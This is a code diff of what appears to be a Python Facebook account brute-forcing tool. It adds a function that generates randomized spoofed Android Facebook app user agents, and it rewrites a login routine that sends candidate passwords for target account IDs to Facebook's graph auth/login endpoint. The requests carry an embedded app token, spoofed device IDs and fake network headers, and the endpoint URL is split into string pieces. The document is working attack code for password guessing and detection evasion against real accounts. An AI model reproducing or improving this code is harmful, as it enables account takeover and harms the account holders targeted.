@@ -301,6 +301,21 @@ for agenku in range(10000):
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
+#--------------------------------------------------------------------------------api and graph--------------------------------------------------------------------------------------------------------
+def sexua():
+    android_versions = ['10', '11', '12']
+    mobile_models = ['Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10','Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3']
+    den = random.choice(['{density=3.0,width=1080,height=2401}','{density=3.0,width=1080,height=2161}','{density=1.5,width=1280,height=720}','{density=2.0,width=720,height=1344}','{density=1.75,width=720,height=1488}','{density=1.0,width=1066,height=552}','{density=2.0,width=480,height=854}','{density=1.5,width=1200,height=1848}','{density=1.3312501,width=1280,height=736}','{density=3.0,width=1080,height=2208}','{density=4.0,width=1440,height=2392}','{density=1.0,width=320,height=480}','{density=3.0,width=1080,height=1920}','{density=1.46875,width=720,height=1510}','{density=2.625,width=1080,height=2034}','{density=1.5,width=1200,height=1920}','{density=2.0,width=720,height=1280}','{density=2.0,width=720,height=1448}','{density=1.275,width=540,height=1071}'])
+    android_version = random.choice(android_versions)
+    mobile_model = random.choice(mobile_models)
+    dev = mobile_model.split(' ')[0]
+    x = str(random.randint(11,999))+".1.0."+str(random.randint(11,99))+"."+str(random.randint(11,99))
+    xx = ''.join(str(random.randint(0, 9)) for _ in range(9))
+    xxx = ''.join(str(random.randint(0, 9)) for _ in range(9))
+    cl = random.choice(['hr_HR','ar_EG','en_Qaau_PK','en_Qaau_GB','en_Qaau_US','as_IN','fa_IR','fi_FI','en_US','en_GB','en_PK','ru_RU','de_DE','en_BD','en_IN','en_AF','ar_Qaau_AR','ar_AR','at_AT','en_AL','en_DZ','en_AS','en_AD','en_AO','en_AI','en_AQ','en_AG','en_AM','en_AW','en_AU','en_AT','en_AZ','en_BS','en_BH','en_BB','en_BY','en_BE','en_BZ','en_BJ','en_BM','en_BT','en_BO','en_BQ','en_BA','en_BW','en_BV','en_BR','en_IO','en_BN','en_BG','en_BF','en_AX','en_ZW','en_ZM','en_YE','en_EH','en_WF','en_VI','en_VG','en_VN','en_VE'])
+    cr = random.choice(['Three','1O1Ocsl','O2','WOM','Telcel','3SE','OneCall','1010','Vodafone IN','Vodafone id','Jazz','Telenor','Zong','Vodefone','Plus','SGP-M1','airtel','Greenphone','StarHub','giga','simyo','BITE','BITE LV','Sprint','inwi','EE','MTS Armenia','UMS','NL KPN','Ufone','China Telecom','SimSim','BAKCELL','Geocell','Jio 4G','Jio','Team','TEAM','UzMobile','Beeline','Vodefone US','A-Mobile','MAGTICOM','XL','axis','Spectrum','ZZ','LMT','Tele2','Fido','CC Network','Shelid','null','TeleTok','SUN Mobile','Club','Lycamobile','VIVIFI','Singtel','Circles','Metro by T-Mobile','YOTA','Turkcell','Uztelecom','Mobiuz','GOLAN T','HUMANS','MegaFon','VIVO','UA-KYIVSTAR','KYIVSTAR','Grameenphone','VIRGIN','Orange'])
+    user_agent = f"[FBAN/EMA;FBBV/{xx};FBAV/{x};FBDV/{mobile_model};FBSV/12;FBCX/notifications_push_client_sync_graphql;FBDM/{{density=2.0}}]"
+    return user_agent
 
 def mainx2():
 	mainx()
@@ -1265,7 +1280,7 @@ def m5(idf,pwv):
     sys.stdout.flush()
     try:
       for pw in pwv:
-            useragent = str(ua_api())
+            useragent = str(sexua())
             data = {'adid':str(uuid.uuid4()),
             'format':'json',
             'device_id':str(uuid.uuid4()),
@@ -1344,45 +1359,50 @@ def m6(idf,pwv):
     try:
       for pw in pwv:
             useragent = str(ua_api())
-            data = {'adid':str(uuid.uuid4()),
-            'format':'json',
-            'device_id':str(uuid.uuid4()),
-            'email':idf,
-            'password':pw,
-            'generate_analytics_claims':'1',
-            'community_id':'',
-            'cpl':'true','try_num':'1',
-            'family_device_id':str(uuid.uuid4()),
-            'credentials_type':'password',
-            'source':'login',
-            'error_detail_type':'button_with_disabled',
-            'enroll_misauth':'false',
-            'generate_session_cookies':'1',
-            'generate_machine_id':'1',
-            'currently_logged_in_userid':'0',
-            'locale':'en_US',
-            'client_country_code':'US',
-            'fb_api_req_friendly_name':'authenticate',
-            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
-            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head = {'User-Agent': useragent,
-            'Accept-Encoding':'gzip, deflate',
-            'Connection':'close',
-            'Content-Type':'application/x-www-form-urlencoded',
-            'Host':'graph.facebook.com',
-            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
-            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
-            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type':'WIFI',
-            'X-Tigon-Is-Retry':'False',
-            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'x-fb-device-group':'5120',
-            'X-FB-Friendly-Name':'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags':'graphservice',
-            'X-FB-HTTP-Engine':'Liger',
-            'X-FB-Client-IP':'True',
-            'X-FB-Server-Cluster':'True',
-            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+            data = {
+            "email":idf,
+            "password":pw,
+            "adid": str(uuid.uuid4()),
+            "device_id": str(uuid.uuid4()),
+            "family_device_id": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "logged_out_id": str(uuid.uuid4()),
+            "locale": "en_US",
+            "client_country_code": "US",
+            "cpl": "true",
+            "source": "login",
+            "format": "json",
+            "omit_response_on_success": "false",
+            "credentials_type": "password",
+            "error_detail_type": "button_with_disabled",
+            "generate_session_cookies": "1",
+            "generate_analytics_claim": "1",
+            "generate_machine_id": "1",
+            "tier": "regular",
+            "currently_logged_in_userid" : "0",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
+            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
+            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
+            "api_key": "882a8490361da98702bf97a021ddc14d",
+            "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
+            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
+            head = {
+            "User-Agent": sexua(),
+            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-Connection-Quality": "EXCELLENT",
+            "X-FB-Connection-Type": "MOBILE.LTE",
+            "X-FB-HTTP-Engine": "Liger",
+            'X-FB-Client-IP': 'True',
+            "X-FB-Friendly-Name": "authenticate",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": str(len(content_lenght))}
             url = 'htt'+'ps://b-gr'+'aph.face'+'book.com/auth/login'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
